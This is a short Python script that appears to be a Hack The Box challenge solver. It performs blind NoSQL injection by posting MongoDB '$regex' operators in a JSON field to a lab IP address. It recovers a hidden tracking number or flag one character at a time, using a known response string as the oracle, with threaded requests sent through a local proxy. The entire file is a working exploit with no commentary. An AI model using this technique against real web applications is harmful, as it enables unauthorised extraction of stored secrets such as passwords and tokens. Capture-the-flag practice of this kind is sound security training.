import requests
import string
import re
from concurrent.futures import ThreadPoolExecutor

# Global variables
# TARGET_REGEX = r'^[0-9a-fA-F]{8}$'
# TARGET_URL = 'http://83.136.255.109:33858/index.php'
# VERIFY_RESPONSE = "Franz Pflaumenbaum"
TARGET_REGEX = r'^HTB\{[0-9a-f]{32}\}$'
TARGET_URL = 'http://83.136.255.109:58517/index.php'
VERIFY_RESPONSE = "bmdyy"

def send_request(prefix, char):
    headers = {
        'Host': '83.136.255.109:33858',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-type': 'application/json',
        'Origin': 'http://83.136.255.109:33858',
        'Connection': 'close',
        'Referer': 'http://83.136.255.109:33858/',
    }

    regex_pattern = f"^{prefix}{char}.*"
    json_data = {
        'trackingNum': {
            '$regex': regex_pattern,
        },
    }

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }

    response = requests.post(TARGET_URL, headers=headers, json=json_data, proxies=proxies, verify=False)
    return response

def process_character(prefix, char):
    try:
        response = send_request(prefix, char)
        if VERIFY_RESPONSE in response.text:
            return char
        else:
            return None
    except Exception as e:
        print(f"Error processing character '{char}': {e}")
        return None

# List of upper case, lower case, and numeric characters
characters = string.ascii_letters + string.digits + "{}"

tracking_number = ""

try:
    while not re.match(TARGET_REGEX, tracking_number):
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(process_character, tracking_number, char) for char in characters]
            for future in futures:
                result = future.result()
                if result:
                    tracking_number += result
                    print(f"Character '{result}' added to tracking_number")
                    if re.match(TARGET_REGEX, tracking_number):
                        executor.shutdown(wait=False)
                        break

except KeyboardInterrupt:
    print("Execution interrupted by user. Exiting gracefully...")

print(f'Final tracking number: {tracking_number}')
